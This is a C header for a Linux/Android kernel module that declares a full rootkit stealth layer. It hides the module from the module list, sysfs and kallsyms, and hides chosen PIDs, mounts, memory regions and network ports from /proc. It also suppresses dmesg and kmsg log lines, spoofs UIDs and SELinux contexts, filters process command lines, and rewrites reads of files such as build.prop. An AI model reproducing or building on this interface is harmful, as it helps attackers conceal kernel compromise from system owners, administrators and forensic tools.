/* SPDX-License-Identifier: GPL-2.0 */
#ifndef NVK_HIDE_H
#define NVK_HIDE_H

#include <linux/types.h>
#include <nvk_rt.h>
#include <linux/compiler.h>
#include <linux/list.h>
#include <linux/kallsyms.h>
#include <nvkmod_version.h>
#include <nvk_hook.h>

typedef void (*nvk_mutex_lock_fn)(void *);
typedef void (*nvk_mutex_unlock_fn)(void *);
typedef void *(*nvk_find_module_fn)(const char *name);
typedef void  (*nvk_kobject_del_fn)(void *kobj);
typedef void  (*nvk_kobject_put_fn)(void *kobj);

struct nvk_hide_state {
	struct list_head *saved_next;
	struct list_head *saved_prev;
	int               hidden;
	struct nvk_hook   find_module_hook;
	nvk_find_module_fn orig_find_module;
	const char       *module_name;
	int               sysfs_removed;
	int               kallsyms_filtered;
	void             *saved_kobj;
	struct nvk_hook   seq_show_hook;
	int               seq_show_hooked;
};

NVK_RT_VAR nvk_mutex_lock_fn   _nvk_hide_mutex_lock;
NVK_RT_VAR nvk_mutex_unlock_fn _nvk_hide_mutex_unlock;
NVK_RT_VAR void               *_nvk_module_mutex;
NVK_RT_VAR nvk_kobject_del_fn  _nvk_kobject_del;
NVK_RT_VAR nvk_kobject_put_fn  _nvk_kobject_put;
NVK_RT_VAR int                 _nvk_hide_inited;

int nvk_hide_init(void);


static __always_inline struct list_head *
_nvk_get_mod_list(struct nvk_this_module *mod)
{
	return (struct list_head *)((char *)mod + NVK_OFF_LIST);
}

void nvk_mod_hide(struct nvk_hide_state *state,
			 struct nvk_this_module *mod);


void nvk_mod_show(struct nvk_hide_state *state,
			 struct nvk_this_module *mod);


static __always_inline int nvk_mod_is_hidden(struct nvk_hide_state *state)
{
	return state->hidden;
}

void nvk_mod_sysfs_remove(struct nvk_hide_state *state,
				 struct nvk_this_module *mod);


typedef int (*nvk_mod_seq_show_fn)(void *seq, void *v);
NVK_RT_VAR nvk_mod_seq_show_fn _nvk_orig_mod_seq_show;
NVK_RT_VAR const char *_nvk_hide_target_name;

int _nvk_str_starts_with(const char *str, const char *prefix);


int _nvk_mod_seq_show_filter(void *seq, void *v);


int nvk_mod_proc_filter(struct nvk_hide_state *state,
			       const char *module_name);


typedef int (*nvk_mod_addr_fn)(unsigned long addr);
NVK_RT_VAR nvk_mod_addr_fn _nvk_orig_mod_text_addr;
NVK_RT_VAR struct nvk_hook _nvk_ks_hook;
NVK_RT_VAR int _nvk_ks_hooked;
NVK_RT_VAR unsigned long _nvk_hide_mod_start;
NVK_RT_VAR unsigned long _nvk_hide_mod_end;

int _nvk_mod_text_addr_filter(unsigned long addr);


int nvk_mod_kallsyms_filter(struct nvk_hide_state *state,
				   const char *module_name);


void nvk_mod_full_hide(struct nvk_hide_state *state,
			      struct nvk_this_module *mod,
			      const char *module_name);


void _nvk_hide_cleanup(struct nvk_hide_state *state,
			      struct nvk_this_module *mod);


#define NVK_HIDE_INIT_STATE { .saved_next = 0, .saved_prev = 0,  \
			      .hidden = 0, .module_name = 0,     \
			      .sysfs_removed = 0,                 \
			      .kallsyms_filtered = 0,             \
			      .saved_kobj = 0,                    \
			      .seq_show_hooked = 0 }


/* --- /proc/pid hiding --- */

typedef int (*nvk_proc_readdir_fn)(void *file, void *ctx);
typedef int (*nvk_filldir_fn)(void *ctx, const char *name, int namlen,
			      long long offset, u64 ino, unsigned int type);

#define NVK_HIDE_PID_MAX 32

struct nvk_pid_hide_state {
	int              pids[NVK_HIDE_PID_MAX];
	int              count;
	struct nvk_hook_ctx ctx_hook;
	int              active;
};

NVK_RT_VAR struct nvk_pid_hide_state _nvk_pid_state;

int _nvk_atoi(const char *s, int len);


int _nvk_pid_is_hidden(int pid);


#define _NVK_PID_ACTOR_SLOTS 8

struct _nvk_pid_actor_slot {
	volatile unsigned long task;
	nvk_filldir_fn orig;
};

NVK_RT_VAR struct _nvk_pid_actor_slot
	_nvk_pid_actors[_NVK_PID_ACTOR_SLOTS];

int _nvk_pid_actor_acquire(nvk_filldir_fn orig);


void _nvk_pid_actor_release(void);


nvk_filldir_fn _nvk_pid_actor_get_orig(void);


int _nvk_pid_filldir_wrap(void *ctx, const char *name, int namlen,
				 long long offset, u64 ino, unsigned int type);


void _nvk_pid_readdir_ctx(nvk_reg_ctx *ctx);


int nvk_pid_hide_add(int pid);


int nvk_pid_hide_remove(int pid);


int nvk_pid_hide_install(void);


static __always_inline int nvk_pid_should_hide(int pid)
{
	if (!_nvk_pid_state.active) return 0;
	return _nvk_pid_is_hidden(pid);
}

void nvk_pid_hide_cleanup(void);



/* --- /proc/mounts path filter --- */

typedef int (*nvk_mounts_show_fn)(void *seq, void *v);
NVK_RT_VAR struct nvk_hook _nvk_mounts_hook;

#define NVK_MOUNT_FILTER_MAX 8
#define NVK_MOUNT_PATH_MAX   64

struct nvk_mount_filter {
	char paths[NVK_MOUNT_FILTER_MAX][NVK_MOUNT_PATH_MAX];
	int  count;
	int  active;
};

NVK_RT_VAR struct nvk_mount_filter _nvk_mnt_filter;

int nvk_mount_filter_add(const char *path);


NVK_RT_VAR nvk_mounts_show_fn _nvk_orig_mounts_show_fn;

int _nvk_mnt_path_match(const char *haystack);


int _nvk_mounts_show_filter(void *seq, void *v);


int nvk_mount_filter_install(void);


void nvk_mount_filter_cleanup(void);



/* --- /proc/pid/maps module region filter --- */

#define NVK_MAPS_FILTER_MAX 4

struct nvk_maps_filter_region {
	unsigned long start;
	unsigned long end;
};

NVK_RT_VAR struct nvk_maps_filter_region _nvk_maps_regions[NVK_MAPS_FILTER_MAX];
NVK_RT_VAR int _nvk_maps_region_count;

int nvk_maps_filter_add(unsigned long start, unsigned long end);


static __always_inline int nvk_maps_should_hide(unsigned long addr)
{
	int i;
	for (i = 0; i < _nvk_maps_region_count; i++) {
		if (addr >= _nvk_maps_regions[i].start &&
		    addr < _nvk_maps_regions[i].end)
			return 1;
	}
	return 0;
}

void nvk_maps_filter_clear(void);


void nvk_maps_filter_add_self(void);


void nvk_mod_wipe_modinfo(struct nvk_this_module *mod);



typedef int (*nvk_vmalloc_show_fn)(void *seq, void *v);
NVK_RT_VAR struct nvk_hook _nvk_vmalloc_hook;
NVK_RT_VAR nvk_vmalloc_show_fn _nvk_orig_vmalloc_show;
NVK_RT_VAR int _nvk_vmalloc_hooked;
NVK_RT_VAR unsigned long _nvk_vmalloc_hide_start;
NVK_RT_VAR unsigned long _nvk_vmalloc_hide_end;

struct _nvk_vmap_area {
	unsigned long va_start;
	unsigned long va_end;
};

int _nvk_vmalloc_show_filter(void *seq, void *v);


void *_nvk_resolve_vmalloc_s_show(void);


int nvk_mod_vmalloc_filter(void);



/* --- dmesg / kmsg log suppression --- */

NVK_RT_VAR struct nvk_hook_ctx _nvk_dmesg_ctx_hook;
NVK_RT_VAR int _nvk_dmesg_hooked;

#define NVK_DMESG_FILTER_MAX 4
#define NVK_DMESG_FILTER_LEN 32

NVK_RT_VAR char _nvk_dmesg_filters[NVK_DMESG_FILTER_MAX][NVK_DMESG_FILTER_LEN];
NVK_RT_VAR int _nvk_dmesg_filter_cnt;

int nvk_dmesg_filter_add(const char *keyword);


int _nvk_str_contains(const char *haystack, const char *needle);


int _nvk_dmesg_should_suppress(const char *text);


__attribute__((__noinline__)) long _nvk_dmesg_ret0(void);


NVK_RT_VAR int _nvk_dmesg_fmt_reg;

void _nvk_dmesg_ctx_handler(nvk_reg_ctx *ctx);


int nvk_dmesg_suppress_install(const char *module_name);


void nvk_dmesg_suppress_cleanup(void);



/* --- /proc/kmsg read filter --- */

typedef long (*nvk_kmsg_read_fn)(void *filp, char __user *buf,
				 size_t count, long long *ppos);
NVK_RT_VAR struct nvk_hook _nvk_kmsg_read_hook;
NVK_RT_VAR nvk_kmsg_read_fn _nvk_orig_kmsg_read;
NVK_RT_VAR int _nvk_kmsg_read_hooked;

long _nvk_kmsg_read_filter(void *filp, char __user *buf,
				  size_t count, long long *ppos);


int nvk_kmsg_read_filter_install(void);


void nvk_kmsg_read_filter_cleanup(void);


/* --- /proc/pid/status UID spoofing --- */

typedef long (*nvk_proc_status_show_fn)(void *seq, void *v);
NVK_RT_VAR struct nvk_hook _nvk_proc_status_hook;
NVK_RT_VAR nvk_proc_status_show_fn _nvk_orig_proc_status;
NVK_RT_VAR int _nvk_proc_status_hooked;

NVK_RT_VAR u32 _nvk_status_spoof_uid;
NVK_RT_VAR u32 _nvk_status_spoof_gid;

typedef int (*nvk_seq_printf_fn)(void *seq, const char *fmt, ...);
NVK_RT_VAR nvk_seq_printf_fn _nvk_seq_printf_fn;

void _nvk_status_ctx_handler(nvk_reg_ctx *ctx);


int nvk_proc_status_filter_install(u32 fake_uid, u32 fake_gid);


void nvk_proc_status_filter_cleanup(void);



/* --- /proc/pid/attr/* SELinux context filter --- */

typedef long (*nvk_proc_attr_read_fn)(void *file, char __user *buf,
				      size_t count, long long *ppos);
NVK_RT_VAR struct nvk_hook _nvk_proc_attr_hook;
NVK_RT_VAR nvk_proc_attr_read_fn _nvk_orig_proc_attr_read;
NVK_RT_VAR int _nvk_proc_attr_hooked;

NVK_RT_VAR const char *_nvk_attr_fake_ctx;

long _nvk_proc_attr_read_filter(void *file, char __user *buf,
					size_t count, long long *ppos);


int nvk_proc_attr_filter_install(const char *fake_context);


void nvk_proc_attr_filter_cleanup(void);



/* --- /proc/net/tcp{,6} port hiding --- */

#define NVK_NET_HIDE_PORT_MAX 16

struct nvk_net_hide_state {
	u16 ports[NVK_NET_HIDE_PORT_MAX];
	int count;
	struct nvk_hook tcp4_hook;
	struct nvk_hook tcp6_hook;
	struct nvk_hook udp4_hook;
	struct nvk_hook udp6_hook;
	int active;
};

NVK_RT_VAR struct nvk_net_hide_state _nvk_net_hide;

typedef int (*nvk_net_seq_show_fn)(void *seq, void *v);
NVK_RT_VAR nvk_net_seq_show_fn _nvk_orig_tcp4_show;
NVK_RT_VAR nvk_net_seq_show_fn _nvk_orig_tcp6_show;
NVK_RT_VAR nvk_net_seq_show_fn _nvk_orig_udp4_show;
NVK_RT_VAR nvk_net_seq_show_fn _nvk_orig_udp6_show;

int nvk_net_hide_add_port(u16 port);


int _nvk_net_port_hidden(u16 port);


#define _NVK_SKC_DPORT_OFF 12
#define _NVK_SKC_NUM_OFF   14

int _nvk_extract_ports(void *sk, u16 *sport, u16 *dport);


int _nvk_net_filter_show(void *seq, void *v,
				nvk_net_seq_show_fn orig);


int _nvk_tcp4_show_filter(void *seq, void *v);


int _nvk_tcp6_show_filter(void *seq, void *v);


int _nvk_udp4_show_filter(void *seq, void *v);


int _nvk_udp6_show_filter(void *seq, void *v);


int nvk_net_hide_install(void);


void nvk_net_hide_cleanup(void);



/* --- /proc/pid/cmdline content filter --- */

typedef long (*nvk_cmdline_read_fn)(void *file, char __user *buf,
				    size_t count, long long *ppos);
NVK_RT_VAR struct nvk_hook _nvk_cmdline_hook;
NVK_RT_VAR nvk_cmdline_read_fn _nvk_orig_cmdline_read;
NVK_RT_VAR int _nvk_cmdline_hooked;

#define NVK_CMDLINE_FILTER_MAX 4
#define NVK_CMDLINE_FILTER_LEN 32

NVK_RT_VAR char _nvk_cmdline_filters[NVK_CMDLINE_FILTER_MAX][NVK_CMDLINE_FILTER_LEN];
NVK_RT_VAR int _nvk_cmdline_filter_cnt;

int nvk_cmdline_filter_add(const char *keyword);


long _nvk_cmdline_read_filter(void *file, char __user *buf,
				     size_t count, long long *ppos);


int nvk_cmdline_filter_install(void);


void nvk_cmdline_filter_cleanup(void);



/* --- File read interception (build.prop, /proc/version spoofing) --- */

typedef long (*nvk_vfs_read_fn)(void *file, char __user *buf,
				size_t count, long long *pos);

NVK_RT_VAR struct nvk_hook _nvk_vfs_read_hook;
NVK_RT_VAR nvk_vfs_read_fn _nvk_orig_vfs_read;
NVK_RT_VAR int _nvk_vfs_read_hooked;

#define NVK_FILE_SPOOF_MAX 4
#define NVK_FILE_PATH_MAX  64
#define NVK_FILE_SPOOF_MAX_LEN 128

struct nvk_file_spoof_entry {
	char path[NVK_FILE_PATH_MAX];
	char search[NVK_FILE_SPOOF_MAX_LEN];
	char replace[NVK_FILE_SPOOF_MAX_LEN];
	int  search_len;
	int  replace_len;
};

NVK_RT_VAR struct nvk_file_spoof_entry _nvk_file_spoofs[NVK_FILE_SPOOF_MAX];
NVK_RT_VAR int _nvk_file_spoof_cnt;

int nvk_file_spoof_add(const char *path,
			      const char *search, int slen,
			      const char *replace, int rlen);


#define _NVK_FILE_DENTRY_OFF 0x18
#define _NVK_DENTRY_DNAME_NAME_OFF 0x28

int _nvk_file_match_path(void *file, const char *target);


long _nvk_vfs_read_filter(void *file, char __user *buf,
				 size_t count, long long *pos);


int nvk_file_spoof_install(void);


void nvk_file_spoof_cleanup(void);


#endif /* NVK_HIDE_H */
